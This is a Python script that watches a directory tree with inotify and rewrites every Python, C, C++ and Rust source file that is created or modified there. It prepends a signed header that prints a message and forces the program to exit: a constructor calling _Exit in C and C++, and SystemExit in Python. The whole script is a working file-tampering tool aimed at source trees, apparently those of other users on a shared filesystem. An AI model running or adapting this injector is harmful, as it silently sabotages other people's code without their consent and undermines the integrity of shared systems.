#!/usr/bin/env python3
from __future__ import annotations

import argparse
import ctypes
import os
import select
import struct
import sys
from pathlib import Path
from typing import Dict, Iterator, Optional, Set

DEFAULT_USER = os.environ.get("USER", "achaisne")
DEFAULT_ROOT = f"/sgoinfre/goinfre/Perso/{DEFAULT_USER}"
DEFAULT_TEST_ACTION_DIR = "/home/achaisne/sgoinfre/test"
DEFAULT_POLL_SECONDS = 2.0
DEFAULT_EXCLUDED_DIRS = {
    ".git",
    ".hg",
    ".svn",
    "__pycache__",
    "node_modules",
    ".cache",
    ".venv",
    "venv",
    "target",
    "build",
    "dist",
    ".tox",
    ".mypy_cache",
    ".pytest_cache",
}

MARKER = "FROM ACHAISNE CONTACT si@42paris.fr. WITH LOVE"

INJECTIONS = {
    ".py": (
        f"# {MARKER}\n"
        "print('hello world')\n"
        "raise SystemExit(0)\n"
        "\n"
    ),
    ".c": (
        f"// {MARKER}\n"
        "#include <unistd.h>\n"
        "#include <stdlib.h>\n"
        "__attribute__((constructor))\n"
        "static void keystroke_injection_boot(void) {\n"
        f"    ssize_t ks_written = write(1, \"{MARKER}\\n\", {len(MARKER) + 1});\n"
        "    (void)ks_written;\n"
        "    _Exit(0);\n"
        "}\n"
        "\n"
    ),
    ".cpp": (
        f"// {MARKER}\n"
        "#include <unistd.h>\n"
        "#include <cstdlib>\n"
        "__attribute__((constructor))\n"
        "static void keystroke_injection_boot(void) {\n"
        f"    ssize_t ks_written = write(1, \"{MARKER}\\n\", {len(MARKER) + 1});\n"
        "    (void)ks_written;\n"
        "    std::_Exit(0);\n"
        "}\n"
        "\n"
    ),
    ".rs": (
        f"// {MARKER}\n"
        "fn main() {\n"
        "    println!(\"hello world\");\n"
        "    std::process::exit(0);\n"
        "}\n"
        "\n"
    ),
}

IN_CLOSE_WRITE = 0x00000008
IN_ATTRIB = 0x00000004
IN_MOVED_TO = 0x00000080
IN_CREATE = 0x00000100
IN_DELETE_SELF = 0x00000400
IN_MOVE_SELF = 0x00000800
IN_Q_OVERFLOW = 0x00004000
IN_IGNORED = 0x00008000
IN_DONT_FOLLOW = 0x02000000
IN_EXCL_UNLINK = 0x04000000
IN_ISDIR = 0x40000000

WATCH_MASK = (
    IN_CLOSE_WRITE
    | IN_MOVED_TO
    | IN_CREATE
    | IN_ATTRIB
    | IN_DELETE_SELF
    | IN_MOVE_SELF
)


def split_excluded_dirs(value: str) -> Set[str]:
    return {chunk.strip() for chunk in value.split(",") if chunk.strip()}


def should_skip_dir_name(name: str, excluded_dirs: Set[str]) -> bool:
    return name in excluded_dirs


def already_injected(head: str) -> bool:
    return MARKER in head


def safe_write_atomic(path: Path, content: bytes) -> None:
    tmp = path.with_name(path.name + ".tmp_inject")
    with tmp.open("wb") as f:
        f.write(content)
        f.flush()
        os.fsync(f.fileno())
    tmp.replace(path)


def inject_file(path: Path, injection: str, dry_run: bool) -> tuple[bool, str]:
    try:
        original = path.read_bytes()
    except Exception as e:
        return False, f"READ FAIL: {path} ({e})"

    head = original[:2048].decode("utf-8", errors="ignore")
    if already_injected(head):
        return False, f"SKIP (already injected): {path}"

    if dry_run:
        return True, f"DRY RUN would inject: {path}"

    try:
        safe_write_atomic(path, injection.encode("utf-8") + original)
    except Exception as e:
        return False, f"WRITE FAIL: {path} ({e})"

    return True, f"INJECTED: {path}"


def iter_dirs_for_watch(root: Path, excluded_dirs: Set[str]) -> Iterator[Path]:
    stack = [root]
    while stack:
        current = stack.pop()
        yield current
        try:
            with os.scandir(current) as entries:
                for entry in entries:
                    if not entry.is_dir(follow_symlinks=False):
                        continue
                    if should_skip_dir_name(entry.name, excluded_dirs):
                        continue
                    stack.append(Path(entry.path))
        except (PermissionError, FileNotFoundError, NotADirectoryError, OSError):
            continue


def path_is_within(path: Path, root: Path) -> bool:
    try:
        path.relative_to(root)
        return True
    except ValueError:
        return False


class InotifyTreeWatcher:
    def __init__(self, root: Path, excluded_dirs: Set[str]):
        self.root = root
        self.excluded_dirs = excluded_dirs
        self.libc = ctypes.CDLL("libc.so.6", use_errno=True)
        self.fd = self.libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
        if self.fd < 0:
            err = ctypes.get_errno()
            raise OSError(err, os.strerror(err))
        self.wd_to_dir: Dict[int, Path] = {}
        self.dir_to_wd: Dict[Path, int] = {}
        self._add_existing_dirs()

    def close(self) -> None:
        if self.fd >= 0:
            os.close(self.fd)
            self.fd = -1
        self.wd_to_dir.clear()
        self.dir_to_wd.clear()

    def _add_watch(self, directory: Path) -> None:
        if directory in self.dir_to_wd:
            return
        wd = self.libc.inotify_add_watch(
            self.fd,
            str(directory).encode("utf-8", errors="ignore"),
            WATCH_MASK | IN_EXCL_UNLINK | IN_DONT_FOLLOW,
        )
        if wd < 0:
            return
        self.dir_to_wd[directory] = wd
        self.wd_to_dir[wd] = directory

    def _add_existing_dirs(self) -> None:
        for directory in iter_dirs_for_watch(self.root, self.excluded_dirs):
            self._add_watch(directory)

    def _remove_watch(self, wd: int) -> None:
        base = self.wd_to_dir.pop(wd, None)
        if base is not None:
            self.dir_to_wd.pop(base, None)

    def _decode_name(self, raw_name: bytes) -> str:
        name = raw_name.split(b"\x00", 1)[0]
        return name.decode("utf-8", errors="ignore")

    def read_changed_files(self, timeout_seconds: float) -> Set[Path]:
        changed: Set[Path] = set()
        readable, _, _ = select.select([self.fd], [], [], timeout_seconds)
        if not readable:
            return changed

        while True:
            try:
                data = os.read(self.fd, 65536)
            except BlockingIOError:
                break
            if not data:
                break

            offset = 0
            while offset + 16 <= len(data):
                wd, mask, _cookie, name_len = struct.unpack_from("iIII", data, offset)
                name_raw = data[offset + 16 : offset + 16 + name_len]
                offset += 16 + name_len

                if mask & IN_Q_OVERFLOW:
                    continue
                if mask & IN_IGNORED:
                    self._remove_watch(wd)
                    continue

                base = self.wd_to_dir.get(wd)
                if base is None:
                    continue

                name = self._decode_name(name_raw)
                path = base / name if name else base

                if mask & IN_ISDIR:
                    if name and should_skip_dir_name(name, self.excluded_dirs):
                        continue
                    if mask & (IN_CREATE | IN_MOVED_TO):
                        self._add_watch(path)
                    continue

                changed.add(path)

        return changed


def main() -> int:
    parser = argparse.ArgumentParser(description="Inotify tree watcher with code injection.")
    parser.add_argument("--root", default=DEFAULT_ROOT, help=f"Tree to watch (default: {DEFAULT_ROOT})")
    parser.add_argument("--action-dir", default="", help="Optional folder where injection is allowed")
    parser.add_argument(
        "--stop-after-first",
        action="store_true",
        help="Exit after first successful injection",
    )
    parser.add_argument("--poll", type=float, default=DEFAULT_POLL_SECONDS, help="Event wait timeout (seconds)")
    parser.add_argument("--dry-run", action="store_true", help="Log changes without writing files")
    parser.add_argument("--verbose", action="store_true", help="Log skipped files")
    parser.add_argument(
        "--exclude-dir",
        default="",
        help="Comma-separated directory names to skip (in addition to built-ins)",
    )
    args = parser.parse_args()

    root = Path(args.root).expanduser().resolve()
    if not root.is_dir():
        print(f"ERROR: root is not a directory: {root}", file=sys.stderr)
        return 2

    action_dir: Optional[Path] = None
    if args.action_dir:
        action_dir = Path(args.action_dir).expanduser().resolve()

    excluded_dirs = set(DEFAULT_EXCLUDED_DIRS)
    excluded_dirs.update(split_excluded_dirs(args.exclude_dir))

    print(f"Watching root: {root}")
    print(f"Target extensions: {', '.join(INJECTIONS.keys())}")
    print(f"Poll interval: {args.poll:.1f}s")
    if action_dir:
        print(f"Action folder filter: {action_dir}")
    else:
        print("Action folder filter: <none>")
    if args.dry_run:
        print("Mode: DRY RUN")

    print("Initializing inotify watches...")
    try:
        watcher = InotifyTreeWatcher(root, excluded_dirs)
    except Exception as e:
        print(f"ERROR: cannot initialize inotify mode: {e}", file=sys.stderr)
        return 2

    print(f"READY: inotify watches active ({len(watcher.wd_to_dir)} directories).")
    print("READY: you can touch files now.")

    injected_count = 0
    try:
        while True:
            changed_paths = watcher.read_changed_files(args.poll)
            if not changed_paths:
                continue

            for path in sorted(changed_paths):
                if path.suffix not in INJECTIONS:
                    continue

                abs_path = path.resolve()
                if action_dir and not path_is_within(abs_path, action_dir):
                    if args.verbose:
                        print(f"SKIP (outside action folder): {path}")
                    continue

                if not abs_path.exists() or not abs_path.is_file():
                    continue

                changed, msg = inject_file(abs_path, INJECTIONS[path.suffix], dry_run=args.dry_run)
                if changed:
                    injected_count += 1
                    print(msg)
                    if args.stop_after_first:
                        print(f"STOP: first injection done ({injected_count}).")
                        return 0
                elif args.verbose:
                    print(msg)
    finally:
        watcher.close()


if __name__ == "__main__":
    raise SystemExit(main())
